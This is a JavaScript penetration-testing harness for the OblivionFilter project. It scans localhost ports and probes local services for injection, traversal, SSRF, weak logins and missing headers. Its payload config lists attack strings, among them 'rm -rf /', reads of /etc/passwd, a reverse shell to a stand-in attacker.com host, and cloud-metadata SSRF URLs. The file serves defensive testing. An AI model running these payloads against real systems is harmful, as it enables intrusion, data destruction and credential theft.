/**
 * OblivionFilter Security Penetration Testing Framework
 * Automated security testing and vulnerability assessment
 * Tests for common security vulnerabilities and attack vectors
 */

const crypto = require('crypto');
const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const { spawn } = require('child_process');
const fs = require('fs').promises;
const path = require('path');

/**
 * Security testing configuration
 */
const SECURITY_TEST_CONFIG = {
  targets: {
    proxy: 'http://localhost:8080',
    dashboard: 'http://localhost:8081',
    api: 'http://localhost:8082'
  },
  attacks: {
    sqlInjection: [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' OR 1=1#",
      "admin'--",
      "admin'/*"
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src=javascript:alert('XSS')>",
      "<body onload=alert('XSS')>"
    ],
    commandInjection: [
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "&& cat /etc/passwd",
      "`cat /etc/passwd`",
      "$(cat /etc/passwd)",
      "; rm -rf /",
      "| nc -e /bin/bash attacker.com 4444"
    ],
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd"
    ],
    headerInjection: [
      "test\r\nX-Injected: true",
      "test\nSet-Cookie: admin=true",
      "test\r\nLocation: http://evil.com",
      "test\n\n<script>alert('XSS')</script>"
    ]
  },
  ports: {
    common: [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443],
    extended: Array.from({length: 65535}, (_, i) => i + 1)
  }
};

/**
 * Security penetration testing orchestrator
 */
class SecurityPenTester {
  constructor() {
    this.results = {
      vulnerabilities: [],
      exposedPorts: [],
      weakCiphers: [],
      certificateIssues: [],
      httpHeaders: [],
      testResults: {}
    };
    this.reportPath = null;
  }

  /**
   * Run comprehensive security assessment
   */
  async runFullAssessment() {
    console.log('🔒 Starting OblivionFilter Security Assessment...');
    
    const startTime = Date.now();
    
    try {
      // Network reconnaissance
      await this.networkReconnaissance();
      
      // Port scanning
      await this.portScanning();
      
      // SSL/TLS testing
      await this.sslTlsTesting();
      
      // Web application testing
      await this.webApplicationTesting();
      
      // Input validation testing
      await this.inputValidationTesting();
      
      // Authentication testing
      await this.authenticationTesting();
      
      // Session management testing
      await this.sessionManagementTesting();
      
      // Configuration testing
      await this.configurationTesting();
      
      // Generate report
      const report = await this.generateSecurityReport();
      
      const endTime = Date.now();
      console.log(`✅ Security assessment completed in ${(endTime - startTime) / 1000}s`);
      
      return report;
    } catch (error) {
      console.error('❌ Security assessment failed:', error);
      throw error;
    }
  }

  /**
   * Network reconnaissance
   */
  async networkReconnaissance() {
    console.log('🔍 Running network reconnaissance...');
    
    try {
      // DNS enumeration
      await this.dnsEnumeration();
      
      // Service detection
      await this.serviceDetection();
      
      // Banner grabbing
      await this.bannerGrabbing();
      
    } catch (error) {
      this.addVulnerability('RECON_ERROR', 'Network reconnaissance failed', 'LOW', error.message);
    }
  }

  /**
   * DNS enumeration
   */
  async dnsEnumeration() {
    const domains = ['localhost', '127.0.0.1', '0.0.0.0'];
    
    for (const domain of domains) {
      try {
        const { dns } = require('dns').promises;
        const records = await dns.resolve(domain);
        
        this.results.testResults.dns = this.results.testResults.dns || {};
        this.results.testResults.dns[domain] = records;
        
      } catch (error) {
        // DNS resolution failures are expected for some domains
      }
    }
  }

  /**
   * Service detection
   */
  async serviceDetection() {
    const targets = Object.values(SECURITY_TEST_CONFIG.targets);
    
    for (const target of targets) {
      try {
        const url = new URL(target);
        const isAlive = await this.checkServiceAlive(url.hostname, url.port || (url.protocol === 'https:' ? 443 : 80));
        
        this.results.testResults.services = this.results.testResults.services || {};
        this.results.testResults.services[target] = { alive: isAlive };
        
      } catch (error) {
        // Service detection failures are informational
      }
    }
  }

  /**
   * Check if service is alive
   */
  checkServiceAlive(host, port) {
    return new Promise((resolve) => {
      const socket = net.createConnection({ host, port, timeout: 5000 });
      
      socket.on('connect', () => {
        socket.destroy();
        resolve(true);
      });
      
      socket.on('error', () => resolve(false));
      socket.on('timeout', () => {
        socket.destroy();
        resolve(false);
      });
    });
  }

  /**
   * Banner grabbing
   */
  async bannerGrabbing() {
    const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443];
    
    for (const port of commonPorts) {
      try {
        const banner = await this.grabBanner('localhost', port);
        if (banner) {
          this.results.testResults.banners = this.results.testResults.banners || {};
          this.results.testResults.banners[port] = banner;
          
          // Check for version disclosure
          if (banner.match(/\d+\.\d+/)) {
            this.addVulnerability(
              'VERSION_DISCLOSURE',
              `Service version disclosed on port ${port}`,
              'LOW',
              `Banner: ${banner.substring(0, 100)}`
            );
          }
        }
      } catch (error) {
        // Banner grabbing failures are expected
      }
    }
  }

  /**
   * Grab service banner
   */
  grabBanner(host, port) {
    return new Promise((resolve) => {
      const socket = net.createConnection({ host, port, timeout: 3000 });
      let banner = '';
      
      socket.on('connect', () => {
        socket.write('GET / HTTP/1.0\r\n\r\n');
      });
      
      socket.on('data', (data) => {
        banner += data.toString();
        if (banner.length > 500) {
          socket.destroy();
          resolve(banner.substring(0, 500));
        }
      });
      
      socket.on('error', () => resolve(null));
      socket.on('timeout', () => {
        socket.destroy();
        resolve(banner || null);
      });
      
      setTimeout(() => {
        socket.destroy();
        resolve(banner || null);
      }, 3000);
    });
  }

  /**
   * Port scanning
   */
  async portScanning() {
    console.log('🔍 Running port scan...');
    
    const openPorts = [];
    const commonPorts = SECURITY_TEST_CONFIG.ports.common;
    
    const scanPromises = commonPorts.map(port => this.scanPort('localhost', port));
    const results = await Promise.allSettled(scanPromises);
    
    results.forEach((result, index) => {
      if (result.status === 'fulfilled' && result.value) {
        openPorts.push(commonPorts[index]);
      }
    });
    
    this.results.exposedPorts = openPorts;
    
    // Check for unnecessary open ports
    const unnecessaryPorts = openPorts.filter(port => 
      ![80, 443, 8080, 8081, 8082].includes(port)
    );
    
    if (unnecessaryPorts.length > 0) {
      this.addVulnerability(
        'UNNECESSARY_PORTS',
        'Unnecessary ports are open',
        'MEDIUM',
        `Open ports: ${unnecessaryPorts.join(', ')}`
      );
    }
  }

  /**
   * Scan individual port
   */
  scanPort(host, port) {
    return new Promise((resolve) => {
      const socket = net.createConnection({ host, port, timeout: 1000 });
      
      socket.on('connect', () => {
        socket.destroy();
        resolve(true);
      });
      
      socket.on('error', () => resolve(false));
      socket.on('timeout', () => {
        socket.destroy();
        resolve(false);
      });
    });
  }

  /**
   * SSL/TLS testing
   */
  async sslTlsTesting() {
    console.log('🔒 Testing SSL/TLS configuration...');
    
    const httpsTargets = Object.values(SECURITY_TEST_CONFIG.targets)
      .filter(target => target.startsWith('https://'));
    
    for (const target of httpsTargets) {
      try {
        const url = new URL(target);
        const result = await this.testSslTls(url.hostname, url.port || 443);
        
        this.results.testResults.ssl = this.results.testResults.ssl || {};
        this.results.testResults.ssl[target] = result;
        
        // Check for SSL/TLS issues
        if (result.protocol && result.protocol < 'TLSv1.2') {
          this.addVulnerability(
            'WEAK_TLS_VERSION',
            'Weak TLS version in use',
            'HIGH',
            `Protocol: ${result.protocol}`
          );
        }
        
        if (result.cipher && this.isWeakCipher(result.cipher)) {
          this.addVulnerability(
            'WEAK_CIPHER',
            'Weak cipher suite in use',
            'MEDIUM',
            `Cipher: ${result.cipher}`
          );
        }
        
      } catch (error) {
        // SSL testing failures are informational
      }
    }
  }

  /**
   * Test SSL/TLS configuration
   */
  testSslTls(host, port) {
    return new Promise((resolve, reject) => {
      const options = {
        host,
        port,
        rejectUnauthorized: false,
        timeout: 5000
      };
      
      const socket = tls.connect(options, () => {
        const result = {
          protocol: socket.getProtocol(),
          cipher: socket.getCipher(),
          certificate: socket.getPeerCertificate(),
          authorized: socket.authorized,
          authorizationError: socket.authorizationError
        };
        
        socket.destroy();
        resolve(result);
      });
      
      socket.on('error', reject);
      socket.on('timeout', () => {
        socket.destroy();
        reject(new Error('SSL connection timeout'));
      });
    });
  }

  /**
   * Check if cipher is weak
   */
  isWeakCipher(cipher) {
    const weakCiphers = ['RC4', 'DES', '3DES', 'MD5', 'SHA1'];
    return weakCiphers.some(weak => 
      cipher.name?.includes(weak) || cipher.version?.includes(weak)
    );
  }

  /**
   * Web application testing
   */
  async webApplicationTesting() {
    console.log('🌐 Testing web application security...');
    
    const targets = Object.values(SECURITY_TEST_CONFIG.targets);
    
    for (const target of targets) {
      try {
        // Test HTTP headers
        await this.testHttpHeaders(target);
        
        // Test for common vulnerabilities
        await this.testCommonVulnerabilities(target);
        
        // Test error handling
        await this.testErrorHandling(target);
        
      } catch (error) {
        this.addVulnerability(
          'WEB_TEST_ERROR',
          'Web application testing failed',
          'LOW',
          error.message
        );
      }
    }
  }

  /**
   * Test HTTP security headers
   */
  async testHttpHeaders(target) {
    try {
      const response = await this.makeHttpRequest(target);
      const headers = response.headers;
      
      this.results.httpHeaders.push({ target, headers });
      
      // Check for missing security headers
      const securityHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'Content-Security-Policy'
      ];
      
      const missingHeaders = securityHeaders.filter(header => !headers[header.toLowerCase()]);
      
      if (missingHeaders.length > 0) {
        this.addVulnerability(
          'MISSING_SECURITY_HEADERS',
          'Missing security headers',
          'MEDIUM',
          `Missing: ${missingHeaders.join(', ')}`
        );
      }
      
      // Check for information disclosure
      if (headers['server']) {
        this.addVulnerability(
          'SERVER_DISCLOSURE',
          'Server information disclosed',
          'LOW',
          `Server: ${headers['server']}`
        );
      }
      
    } catch (error) {
      // HTTP header testing failures are informational
    }
  }

  /**
   * Test common vulnerabilities
   */
  async testCommonVulnerabilities(target) {
    // Test for directory traversal
    await this.testDirectoryTraversal(target);
    
    // Test for open redirects
    await this.testOpenRedirect(target);
    
    // Test for SSRF
    await this.testSSRF(target);
  }

  /**
   * Test directory traversal
   */
  async testDirectoryTraversal(target) {
    const payloads = SECURITY_TEST_CONFIG.attacks.pathTraversal;
    
    for (const payload of payloads) {
      try {
        const testUrl = `${target}/file?path=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl);
        
        if (response.body.includes('root:') || response.body.includes('[users]')) {
          this.addVulnerability(
            'DIRECTORY_TRAVERSAL',
            'Directory traversal vulnerability detected',
            'HIGH',
            `Payload: ${payload}`
          );
        }
      } catch (error) {
        // Test failures are expected
      }
    }
  }

  /**
   * Test open redirect
   */
  async testOpenRedirect(target) {
    const redirectPayloads = [
      'http://evil.com',
      '//evil.com',
      'https://evil.com',
      'javascript:alert("redirect")'
    ];
    
    for (const payload of redirectPayloads) {
      try {
        const testUrl = `${target}/redirect?url=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl, { followRedirects: false });
        
        if (response.statusCode >= 300 && response.statusCode < 400) {
          const location = response.headers.location;
          if (location && location.includes('evil.com')) {
            this.addVulnerability(
              'OPEN_REDIRECT',
              'Open redirect vulnerability detected',
              'MEDIUM',
              `Redirects to: ${location}`
            );
          }
        }
      } catch (error) {
        // Test failures are expected
      }
    }
  }

  /**
   * Test SSRF (Server-Side Request Forgery)
   */
  async testSSRF(target) {
    const ssrfPayloads = [
      'http://localhost:22',
      'http://127.0.0.1:3306',
      'http://169.254.169.254/latest/meta-data/',
      'file:///etc/passwd'
    ];
    
    for (const payload of ssrfPayloads) {
      try {
        const testUrl = `${target}/fetch?url=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl);
        
        if (response.statusCode === 200 && response.body.length > 0) {
          this.addVulnerability(
            'SSRF',
            'Server-Side Request Forgery vulnerability detected',
            'HIGH',
            `Payload: ${payload}`
          );
        }
      } catch (error) {
        // Test failures are expected
      }
    }
  }

  /**
   * Test error handling
   */
  async testErrorHandling(target) {
    const errorPayloads = [
      '/nonexistent-page',
      '/admin',
      '/config',
      '/test.php',
      '/backup.sql'
    ];
    
    for (const payload of errorPayloads) {
      try {
        const testUrl = `${target}${payload}`;
        const response = await this.makeHttpRequest(testUrl);
        
        // Check for stack traces or sensitive information in error pages
        if (response.body.includes('stack trace') || 
            response.body.includes('SQLException') ||
            response.body.includes('Warning:') ||
            response.body.includes('Fatal error:')) {
          
          this.addVulnerability(
            'INFORMATION_DISCLOSURE',
            'Sensitive information disclosed in error pages',
            'MEDIUM',
            `Path: ${payload}`
          );
        }
      } catch (error) {
        // Error testing failures are expected
      }
    }
  }

  /**
   * Input validation testing
   */
  async inputValidationTesting() {
    console.log('🔍 Testing input validation...');
    
    const targets = Object.values(SECURITY_TEST_CONFIG.targets);
    
    for (const target of targets) {
      await this.testSQLInjection(target);
      await this.testXSS(target);
      await this.testCommandInjection(target);
    }
  }

  /**
   * Test SQL injection
   */
  async testSQLInjection(target) {
    const payloads = SECURITY_TEST_CONFIG.attacks.sqlInjection;
    
    for (const payload of payloads) {
      try {
        const testUrl = `${target}/search?q=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl);
        
        if (response.body.includes('SQL syntax') ||
            response.body.includes('mysql_fetch') ||
            response.body.includes('ORA-') ||
            response.body.includes('PostgreSQL')) {
          
          this.addVulnerability(
            'SQL_INJECTION',
            'SQL injection vulnerability detected',
            'CRITICAL',
            `Payload: ${payload}`
          );
        }
      } catch (error) {
        // Test failures are expected
      }
    }
  }

  /**
   * Test XSS (Cross-Site Scripting)
   */
  async testXSS(target) {
    const payloads = SECURITY_TEST_CONFIG.attacks.xss;
    
    for (const payload of payloads) {
      try {
        const testUrl = `${target}/search?q=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl);
        
        if (response.body.includes(payload) && 
            !response.body.includes('&lt;script&gt;')) {
          
          this.addVulnerability(
            'XSS',
            'Cross-Site Scripting vulnerability detected',
            'HIGH',
            `Payload: ${payload}`
          );
        }
      } catch (error) {
        // Test failures are expected
      }
    }
  }

  /**
   * Test command injection
   */
  async testCommandInjection(target) {
    const payloads = SECURITY_TEST_CONFIG.attacks.commandInjection;
    
    for (const payload of payloads) {
      try {
        const testUrl = `${target}/execute?cmd=${encodeURIComponent(payload)}`;
        const response = await this.makeHttpRequest(testUrl);
        
        if (response.body.includes('root:') ||
            response.body.includes('bin/bash') ||
            response.body.includes('Windows') ||
            response.body.includes('System32')) {
          
          this.addVulnerability(
            'COMMAND_INJECTION',
            'Command injection vulnerability detected',
            'CRITICAL',
            `Payload: ${payload}`
          );
        }
      } catch (error) {
        // Test failures are expected
      }
    }
  }

  /**
   * Authentication testing
   */
  async authenticationTesting() {
    console.log('🔐 Testing authentication mechanisms...');
    
    await this.testWeakCredentials();
    await this.testBruteForceProtection();
    await this.testAccountLockout();
  }

  /**
   * Test weak credentials
   */
  async testWeakCredentials() {
    const commonCredentials = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'admin', password: '123456' },
      { username: 'root', password: 'root' },
      { username: 'test', password: 'test' }
    ];
    
    for (const cred of commonCredentials) {
      try {
        const loginResult = await this.testLogin(cred.username, cred.password);
        
        if (loginResult.success) {
          this.addVulnerability(
            'WEAK_CREDENTIALS',
            'Weak default credentials detected',
            'CRITICAL',
            `Username: ${cred.username}, Password: ${cred.password}`
          );
        }
      } catch (error) {
        // Login test failures are expected
      }
    }
  }

  /**
   * Test login attempt
   */
  async testLogin(username, password) {
    try {
      const loginData = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
      const response = await this.makeHttpRequest(
        `${SECURITY_TEST_CONFIG.targets.dashboard}/login`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: loginData
        }
      );
      
      return {
        success: response.statusCode === 200 && !response.body.includes('error'),
        response
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Test brute force protection
   */
  async testBruteForceProtection() {
    const attempts = 10;
    let blockedAfter = null;
    
    for (let i = 0; i < attempts; i++) {
      try {
        const result = await this.testLogin('admin', `wrongpass${i}`);
        
        if (result.response && result.response.statusCode === 429) {
          blockedAfter = i + 1;
          break;
        }
      } catch (error) {
        // Continue testing
      }
    }
    
    if (!blockedAfter) {
      this.addVulnerability(
        'NO_BRUTE_FORCE_PROTECTION',
        'No brute force protection detected',
        'HIGH',
        `${attempts} login attempts were not blocked`
      );
    }
  }

  /**
   * Test account lockout
   */
  async testAccountLockout() {
    // Similar to brute force, but focuses on account-specific lockout
    const attempts = 5;
    let locked = false;
    
    for (let i = 0; i < attempts; i++) {
      try {
        const result = await this.testLogin('admin', 'wrongpassword');
        
        if (result.response && result.response.body.includes('locked')) {
          locked = true;
          break;
        }
      } catch (error) {
        // Continue testing
      }
    }
    
    if (!locked) {
      this.addVulnerability(
        'NO_ACCOUNT_LOCKOUT',
        'No account lockout mechanism detected',
        'MEDIUM',
        'Account should be locked after multiple failed attempts'
      );
    }
  }

  /**
   * Session management testing
   */
  async sessionManagementTesting() {
    console.log('🍪 Testing session management...');
    
    await this.testSessionSecurity();
    await this.testSessionFixation();
  }

  /**
   * Test session security
   */
  async testSessionSecurity() {
    try {
      const response = await this.makeHttpRequest(SECURITY_TEST_CONFIG.targets.dashboard);
      const cookies = response.headers['set-cookie'] || [];
      
      for (const cookie of cookies) {
        if (!cookie.includes('Secure')) {
          this.addVulnerability(
            'INSECURE_COOKIE',
            'Cookie without Secure flag',
            'MEDIUM',
            `Cookie: ${cookie.split(';')[0]}`
          );
        }
        
        if (!cookie.includes('HttpOnly')) {
          this.addVulnerability(
            'HTTPONLY_MISSING',
            'Cookie without HttpOnly flag',
            'MEDIUM',
            `Cookie: ${cookie.split(';')[0]}`
          );
        }
        
        if (!cookie.includes('SameSite')) {
          this.addVulnerability(
            'SAMESITE_MISSING',
            'Cookie without SameSite attribute',
            'LOW',
            `Cookie: ${cookie.split(';')[0]}`
          );
        }
      }
    } catch (error) {
      // Session testing failures are informational
    }
  }

  /**
   * Test session fixation
   */
  async testSessionFixation() {
    try {
      // Get initial session
      const response1 = await this.makeHttpRequest(SECURITY_TEST_CONFIG.targets.dashboard);
      const initialSession = this.extractSessionId(response1);
      
      // Attempt login
      await this.testLogin('admin', 'password');
      
      // Get session after login
      const response2 = await this.makeHttpRequest(SECURITY_TEST_CONFIG.targets.dashboard);
      const postLoginSession = this.extractSessionId(response2);
      
      if (initialSession && postLoginSession && initialSession === postLoginSession) {
        this.addVulnerability(
          'SESSION_FIXATION',
          'Session fixation vulnerability detected',
          'HIGH',
          'Session ID not changed after authentication'
        );
      }
    } catch (error) {
      // Session fixation testing failures are informational
    }
  }

  /**
   * Extract session ID from response
   */
  extractSessionId(response) {
    const cookies = response.headers['set-cookie'] || [];
    for (const cookie of cookies) {
      const match = cookie.match(/SESSIONID=([^;]+)/i);
      if (match) {
        return match[1];
      }
    }
    return null;
  }

  /**
   * Configuration testing
   */
  async configurationTesting() {
    console.log('⚙️ Testing security configuration...');
    
    await this.testFilePermissions();
    await this.testConfigurationFiles();
    await this.testBackupFiles();
  }

  /**
   * Test file permissions
   */
  async testFilePermissions() {
    const sensitiveFiles = [
      'config.json',
      '.env',
      'database.conf',
      'server.key',
      'server.crt'
    ];
    
    for (const file of sensitiveFiles) {
      try {
        const response = await this.makeHttpRequest(`${SECURITY_TEST_CONFIG.targets.dashboard}/${file}`);
        
        if (response.statusCode === 200) {
          this.addVulnerability(
            'EXPOSED_SENSITIVE_FILE',
            'Sensitive file accessible via web',
            'HIGH',
            `File: ${file}`
          );
        }
      } catch (error) {
        // File access testing failures are expected
      }
    }
  }

  /**
   * Test configuration files
   */
  async testConfigurationFiles() {
    const configPaths = [
      '/.git/config',
      '/.svn/entries',
      '/web.config',
      '/.htaccess',
      '/robots.txt',
      '/sitemap.xml'
    ];
    
    for (const path of configPaths) {
      try {
        const response = await this.makeHttpRequest(`${SECURITY_TEST_CONFIG.targets.dashboard}${path}`);
        
        if (response.statusCode === 200 && response.body.length > 0) {
          this.addVulnerability(
            'EXPOSED_CONFIG_FILE',
            'Configuration file exposed',
            'MEDIUM',
            `Path: ${path}`
          );
        }
      } catch (error) {
        // Config file testing failures are expected
      }
    }
  }

  /**
   * Test backup files
   */
  async testBackupFiles() {
    const backupExtensions = ['.bak', '.backup', '.old', '.orig', '.tmp', '.swp'];
    const commonFiles = ['index', 'admin', 'config', 'database', 'login'];
    
    for (const file of commonFiles) {
      for (const ext of backupExtensions) {
        try {
          const response = await this.makeHttpRequest(`${SECURITY_TEST_CONFIG.targets.dashboard}/${file}${ext}`);
          
          if (response.statusCode === 200) {
            this.addVulnerability(
              'EXPOSED_BACKUP_FILE',
              'Backup file accessible',
              'MEDIUM',
              `File: ${file}${ext}`
            );
          }
        } catch (error) {
          // Backup file testing failures are expected
        }
      }
    }
  }

  /**
   * Make HTTP request
   */
  makeHttpRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
      const urlObj = new URL(url);
      const client = urlObj.protocol === 'https:' ? https : http;
      
      const requestOptions = {
        hostname: urlObj.hostname,
        port: urlObj.port,
        path: urlObj.pathname + urlObj.search,
        method: options.method || 'GET',
        headers: options.headers || {},
        timeout: options.timeout || 10000,
        rejectUnauthorized: false
      };
      
      const req = client.request(requestOptions, (res) => {
        let body = '';
        
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body
          });
        });
      });
      
      req.on('error', reject);
      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });
      
      if (options.body) {
        req.write(options.body);
      }
      
      req.end();
    });
  }

  /**
   * Add vulnerability to results
   */
  addVulnerability(type, description, severity, details) {
    this.results.vulnerabilities.push({
      type,
      description,
      severity,
      details,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Generate comprehensive security report
   */
  async generateSecurityReport() {
    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        totalVulnerabilities: this.results.vulnerabilities.length,
        critical: this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
        high: this.results.vulnerabilities.filter(v => v.severity === 'HIGH').length,
        medium: this.results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
        low: this.results.vulnerabilities.filter(v => v.severity === 'LOW').length
      },
      vulnerabilities: this.results.vulnerabilities,
      exposedPorts: this.results.exposedPorts,
      testResults: this.results.testResults,
      recommendations: this.generateRecommendations()
    };
    
    // Generate markdown report
    const markdownReport = this.generateMarkdownSecurityReport(report);
    
    // Save report
    this.reportPath = path.join(__dirname, `../reports/security-assessment-${Date.now()}.md`);
    await fs.mkdir(path.dirname(this.reportPath), { recursive: true });
    await fs.writeFile(this.reportPath, markdownReport);
    
    console.log(`📊 Security report saved: ${this.reportPath}`);
    return report;
  }

  /**
   * Generate markdown security report
   */
  generateMarkdownSecurityReport(report) {
    const severityEmojis = {
      CRITICAL: '🔴',
      HIGH: '🟠',
      MEDIUM: '🟡',
      LOW: '🟢'
    };
    
    return `
# OblivionFilter Security Assessment Report

**Generated:** ${report.timestamp}

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | ${report.summary.critical} |
| High | ${report.summary.high} |
| Medium | ${report.summary.medium} |
| Low | ${report.summary.low} |
| **Total** | **${report.summary.totalVulnerabilities}** |

## Security Score

**${this.calculateSecurityScore(report)}/100**

${report.summary.critical > 0 ? '❌ **CRITICAL VULNERABILITIES FOUND**' : 
  report.summary.high > 0 ? '⚠️ **HIGH RISK VULNERABILITIES FOUND**' : 
  report.summary.medium > 0 ? '🟡 **MEDIUM RISK VULNERABILITIES FOUND**' : 
  '✅ **NO CRITICAL VULNERABILITIES FOUND**'}

## Vulnerabilities Found

${report.vulnerabilities.map(vuln => `
### ${severityEmojis[vuln.severity]} ${vuln.type} (${vuln.severity})

**Description:** ${vuln.description}  
**Details:** ${vuln.details}  
**Detected:** ${vuln.timestamp}
`).join('\n')}

## Network Information

### Open Ports
${report.exposedPorts.length > 0 ? 
  report.exposedPorts.map(port => `- Port ${port}`).join('\n') : 
  'No open ports detected in scan range'}

## Recommendations

${report.recommendations.map(rec => `- ${rec}`).join('\n')}

## Remediation Priority

1. **Immediate (Critical):** ${report.summary.critical} vulnerabilities
2. **High Priority (High):** ${report.summary.high} vulnerabilities  
3. **Medium Priority (Medium):** ${report.summary.medium} vulnerabilities
4. **Low Priority (Low):** ${report.summary.low} vulnerabilities

---
*Generated by OblivionFilter Security Testing Framework*
    `;
  }

  /**
   * Calculate security score
   */
  calculateSecurityScore(report) {
    let score = 100;
    
    // Deduct points based on vulnerability severity
    score -= report.summary.critical * 25;
    score -= report.summary.high * 15;
    score -= report.summary.medium * 10;
    score -= report.summary.low * 5;
    
    return Math.max(0, score);
  }

  /**
   * Generate security recommendations
   */
  generateRecommendations() {
    const recommendations = [];
    
    const criticalVulns = this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL');
    const highVulns = this.results.vulnerabilities.filter(v => v.severity === 'HIGH');
    
    if (criticalVulns.length > 0) {
      recommendations.push('**IMMEDIATE ACTION REQUIRED:** Address all critical vulnerabilities immediately');
    }
    
    if (highVulns.length > 0) {
      recommendations.push('Address high-severity vulnerabilities within 24-48 hours');
    }
    
    // Specific recommendations based on vulnerability types
    const vulnTypes = [...new Set(this.results.vulnerabilities.map(v => v.type))];
    
    if (vulnTypes.includes('SQL_INJECTION')) {
      recommendations.push('Implement parameterized queries to prevent SQL injection');
    }
    
    if (vulnTypes.includes('XSS')) {
      recommendations.push('Implement proper input validation and output encoding');
    }
    
    if (vulnTypes.includes('MISSING_SECURITY_HEADERS')) {
      recommendations.push('Configure proper HTTP security headers');
    }
    
    if (vulnTypes.includes('WEAK_CREDENTIALS')) {
      recommendations.push('Enforce strong password policies and change default credentials');
    }
    
    if (vulnTypes.includes('UNNECESSARY_PORTS')) {
      recommendations.push('Close unnecessary open ports and services');
    }
    
    if (recommendations.length === 0) {
      recommendations.push('✅ Security posture looks good! Continue regular security assessments');
    }
    
    return recommendations;
  }

  /**
   * Cleanup resources
   */
  cleanup() {
    // Any cleanup needed
  }
}

// CLI interface
if (require.main === module) {
  const penTester = new SecurityPenTester();
  
  penTester.runFullAssessment()
    .then(report => {
      console.log('\n🔒 Security Assessment Results:');
      console.log(`Security Score: ${penTester.calculateSecurityScore(report)}/100`);
      console.log(`Total Vulnerabilities: ${report.summary.totalVulnerabilities}`);
      console.log(`Critical: ${report.summary.critical}, High: ${report.summary.high}, Medium: ${report.summary.medium}, Low: ${report.summary.low}`);
      
      penTester.cleanup();
      process.exit(report.summary.critical > 0 ? 1 : 0);
    })
    .catch(error => {
      console.error('Security assessment failed:', error);
      penTester.cleanup();
      process.exit(1);
    });
}

module.exports = {
  SecurityPenTester,
  SECURITY_TEST_CONFIG
};
